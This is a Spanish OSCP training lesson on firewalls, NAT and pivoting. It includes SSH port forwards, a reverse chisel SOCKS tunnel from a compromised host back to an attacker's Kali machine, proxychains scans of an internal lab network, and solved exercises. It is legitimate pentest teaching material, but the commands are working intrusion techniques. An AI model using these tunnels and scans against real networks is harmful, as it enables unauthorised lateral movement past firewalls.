---
title: Firewalls, NAT, Tunneling y Pivoting
order: 18
description: El gran payoff del OSCP — cómo funcionan firewalls y NAT, y cómo atravesar redes internas con port forwarding, túneles SSH, chisel y proxychains.
---

## Firewalls: qué dejan pasar y qué no

Un firewall filtra tráfico según reglas. Dos tipos que debes distinguir:

- **Sin estado (stateless):** decide paquete a paquete según IP/puerto. Simple y rápido, pero tonto.
- **Con estado (stateful):** recuerda las conexiones establecidas. Permite la **respuesta** a una conexión que tú iniciaste, aunque no haya una regla explícita de entrada. Es el estándar.

Esa diferencia es la base de muchas evasiones: un firewall stateful bloquea conexiones *entrantes* nuevas, pero **confía en las salientes** que él mismo permitió salir. Por eso los túneles suelen montarse en **reverse** (la víctima conecta *hacia fuera*, hacia ti).

> [!TIP]
> Si un host filtra todo lo entrante pero deja salir tráfico (casi siempre), una shell **reversa** y un túnel **reverso** son tu camino: la máquina interna inicia la conexión hacia tu Kali, y el firmware stateful la deja pasar como si fuera tráfico legítimo de salida.

## NAT: por qué existen las redes internas

**NAT** (Network Address Translation) permite que muchas máquinas con IP **privada** (10.x, 172.16–31.x, 192.168.x) compartan una IP **pública**. El router reescribe las direcciones y mantiene una tabla de traducción.

```text
  192.168.1.10:53012  ──►  [ROUTER NAT]  ──►  93.184.216.34:443
   (IP privada interna)        reescribe        (IP pública destino)
                          guarda: privado↔público en su tabla
```

La consecuencia para ti: las máquinas internas **no son alcanzables directamente** desde fuera. Solo puedes llegar a ellas **a través** de una máquina que ya esté dentro. Eso es el pivoting.

## Pivoting: el concepto central del OSCP

Comprometes una máquina que tiene **dos interfaces** (*dual-homed*): una en la red que tú ves, y otra en una red interna que no ves. Esa máquina es tu **pívot**: enrutas tu tráfico a través de ella para alcanzar la red interna.

![Topología de pivoting](/manual/redes/pivoting.svg)

El primer reflejo al conseguir acceso: **buscar más redes**.

```bash
ip a              # ¿cuántas interfaces/redes tiene esta máquina?
ip route          # ¿a qué redes sabe llegar?
arp -a            # ¿qué vecinos ha visto?
```

Si aparece una interfaz en, por ejemplo, `172.16.0.0/24` que tu Kali no alcanza → ahí está tu red interna.

## Port forwarding y túneles

### SSH: el todoterreno

Si tienes credenciales o clave SSH, el propio SSH monta túneles. Tres modos, memorízalos por la letra:

| Flag | Nombre | Qué hace |
|------|--------|----------|
| `-L` | **Local** forward | Un puerto **local tuyo** → un destino accesible por el servidor SSH |
| `-R` | **Remote** forward | Un puerto en el **servidor** → un destino accesible por ti |
| `-D` | **Dynamic** (SOCKS) | Crea un **proxy SOCKS** que enruta *todo* por el túnel |

```bash
# LOCAL: quiero llegar al 3306 interno (172.16.0.10) que solo ve el pívot
ssh -L 3306:172.16.0.10:3306 user@10.10.10.5
#   → ahora conecto a localhost:3306 y salgo por el pívot

# DYNAMIC (SOCKS): el más útil para escanear toda la red interna
ssh -D 1080 user@10.10.10.5
#   → proxy SOCKS en localhost:1080; combínalo con proxychains
```

### chisel: cuando no hay SSH

`chisel` monta un túnel sobre HTTP/WebSockets; ideal cuando solo puedes ejecutar un binario en la víctima. Patrón típico (túnel **reverso** + SOCKS):

```bash
# En tu Kali (servidor del túnel)
./chisel server -p 8000 --reverse

# En la máquina comprometida (cliente que conecta hacia ti)
./chisel client 10.10.14.7:8000 R:socks
#   → te expone un proxy SOCKS en tu Kali (por defecto :1080)
```

### proxychains: hacer que tus herramientas usen el túnel

`proxychains` fuerza a cualquier herramienta a salir por un proxy SOCKS. Configura `/etc/proxychains4.conf` con `socks5 127.0.0.1 1080` y antepón `proxychains`:

```bash
proxychains nmap -sT -Pn -p 445,3389 172.16.0.10
proxychains netexec smb 172.16.0.0/24
proxychains firefox http://172.16.0.30
```

> [!IMPORTANT]
> A través de proxychains usa siempre **`-sT` y `-Pn`** en nmap: el proxy SOCKS solo transporta **conexiones TCP completas**, no paquetes SYN crudos ni ICMP. Escanea pocos puertos: por el túnel todo va más lento.

> [!NOTE]
> Alternativas modernas muy usadas: **`ligolo-ng`** (crea una interfaz `tun`, no necesitas proxychains y va rapidísimo) y **`sshuttle`** (VPN "pobre" sobre SSH). Cuando domines el concepto, `ligolo-ng` te hará la vida mucho más fácil.

## Práctica

**Ejercicio 1.** Comprometes `10.10.10.5`. Un `ip a` muestra `eth1: 172.16.0.5/24`. Tu Kali (`10.10.14.7`) no llega a esa red. Quieres escanear `172.16.0.10`. Describe el montaje completo con chisel + proxychains.

<details>
<summary>Ver solución</summary>

1. **En Kali** (servidor del túnel):
   ```bash
   ./chisel server -p 8000 --reverse
   ```
2. **Sube chisel a la víctima** y conéctala hacia ti con un SOCKS reverso:
   ```bash
   ./chisel client 10.10.14.7:8000 R:socks
   ```
3. **Configura proxychains** (`/etc/proxychains4.conf`): `socks5 127.0.0.1 1080`.
4. **Escanea a través del túnel** (TCP connect + sin ping, pocos puertos):
   ```bash
   proxychains nmap -sT -Pn -p 22,80,445,3389 172.16.0.10
   ```
El tráfico entra por el túnel a `10.10.10.5` y sale por su `eth1` hacia `172.16.0.10`.

</details>

**Ejercicio 2.** ¿Por qué se usa más un túnel **reverso** (la víctima conecta hacia ti) que uno directo, cuando la máquina interna está tras un firewall stateful?

<details>
<summary>Ver solución</summary>

Porque un firewall stateful bloquea conexiones **entrantes** nuevas hacia la víctima, pero permite las **salientes** que ella inicia (y sus respuestas). Si tú intentas conectar *hacia* la víctima, el firewall lo corta. Si la **víctima** conecta *hacia ti* (reverso), el firewall lo ve como tráfico de salida legítimo y lo deja pasar. Por eso las shells y túneles reversos son la norma en pentesting.

</details>

**Ejercicio 3 (reto).** ¿Qué comando de una sola línea con SSH te daría un proxy SOCKS para enrutar todas tus herramientas por el pívot, sin subir binarios?

<details>
<summary>Ver solución</summary>

```bash
ssh -D 1080 user@10.10.10.5
```
Crea un proxy SOCKS en `localhost:1080` usando solo SSH (nada que subir). Luego `proxychains <herramienta> <objetivo-interno>`. Es el equivalente "nativo" al SOCKS reverso de chisel cuando ya tienes credenciales SSH válidas en el pívot.

</details>

## Recursos

- [**HTB Academy — "Pivoting, Tunneling & Port Forwarding"**](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding) — el módulo de referencia.
- [**ligolo-ng (GitHub + Wiki)**](https://github.com/nicocha30/ligolo-ng) — la herramienta de pivoting moderna, con guía de uso.
- [**IppSec.rocks**](https://ippsec.rocks/) y [**0xdf**](https://0xdf.gitlab.io/) — busca máquinas con pivoting; verlo resuelto lo asienta.
- **Lección [Direccionamiento y Subnetting](/cybersec/manual/redes/direccionamiento-y-subnetting)** — sin subnetting no hay pivoting.
